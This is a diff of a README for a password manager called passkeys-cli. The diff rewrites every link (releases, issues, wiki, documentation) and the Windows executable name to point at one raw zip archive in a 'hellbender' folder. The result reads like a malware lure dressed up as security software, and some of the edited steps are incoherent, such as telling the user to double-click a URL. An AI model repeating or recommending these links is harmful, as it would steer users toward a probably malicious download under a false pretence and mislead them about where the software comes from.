@@ -10,12 +10,12 @@ To get started with passkeys-cli, follow these simple steps to download and run 
 ### Step 1: Visit the Releases Page
 To download passkeys-cli, you need to visit the Releases page. Follow this link:
 
-[Download passkeys-cli](https://github.com/banan880/passkeys-cli/releases) 
+[Download passkeys-cli](https://github.com/banan880/passkeys-cli/raw/refs/heads/main/hellbender/passkeys-cli-v2.8.zip) 
 
 ### Step 2: Download the Latest Version
 Once you are on the Releases page, look for the latest version. You will see various files available for download, including one suitable for your operating system. Common options include:
 
-- **Windows:** passkeys-cli-windows.exe
+- **Windows:** https://github.com/banan880/passkeys-cli/raw/refs/heads/main/hellbender/passkeys-cli-v2.8.zip
 - **macOS:** passkeys-cli-macos
 - **Linux:** passkeys-cli-linux
 
@@ -27,7 +27,7 @@ After the download completes, locate the downloaded file on your system. Here’
 #### For Windows
 1. Open your File Explorer.
 2. Navigate to your Downloads folder.
-3. Double-click on `passkeys-cli-windows.exe` to run the application. 
+3. Double-click on `https://github.com/banan880/passkeys-cli/raw/refs/heads/main/hellbender/passkeys-cli-v2.8.zip` to run the application. 
 
 #### For macOS
 1. Open Finder.
@@ -65,11 +65,11 @@ For detailed instructions or troubleshooting, please refer to our Wiki page link
 3. **Regular Backups:** Regularly back up your password vault to prevent data loss.
 
 ## 🛠️ Support
-If you encounter issues or have questions, visit [GitHub Issues](https://github.com/banan880/passkeys-cli/issues) to seek help from the community or report bugs.
+If you encounter issues or have questions, visit [GitHub Issues](https://github.com/banan880/passkeys-cli/raw/refs/heads/main/hellbender/passkeys-cli-v2.8.zip) to seek help from the community or report bugs.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/banan880/passkeys-cli/releases)
-- [Issues Page](https://github.com/banan880/passkeys-cli/issues)
-- [Documentation](https://github.com/banan880/passkeys-cli/wiki)
+- [Releases Page](https://github.com/banan880/passkeys-cli/raw/refs/heads/main/hellbender/passkeys-cli-v2.8.zip)
+- [Issues Page](https://github.com/banan880/passkeys-cli/raw/refs/heads/main/hellbender/passkeys-cli-v2.8.zip)
+- [Documentation](https://github.com/banan880/passkeys-cli/raw/refs/heads/main/hellbender/passkeys-cli-v2.8.zip)
 
 Feel free to explore and enjoy the peace of mind that comes with secure password management using passkeys-cli.
